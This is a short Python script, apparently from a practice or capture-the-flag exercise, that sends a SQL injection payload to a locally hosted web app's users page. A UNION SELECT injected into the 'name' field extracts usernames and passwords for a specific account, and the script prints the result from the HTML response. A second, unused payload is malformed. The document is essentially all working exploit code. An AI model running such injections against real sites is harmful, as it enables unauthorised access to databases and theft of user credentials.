import requests
from bs4 import BeautifulSoup

ip = 'http://0.0.0.0:5001/'
mail = '"james@bond.mi5"'
page = 'users'
injection = '\' union select  from contact_messages -- '

field = {'name': '\' union select name, password from users where name=\"inspector_derrick\" limit 5 -- FUNNY STUFF THAT MAKES NO SENSE'}

url = ip + page

response = requests.post(url, data=field)
print(response.text)
soup = BeautifulSoup(response.text, 'html.parser')
print(soup.find('p', {"class": "list-group-item"}).text)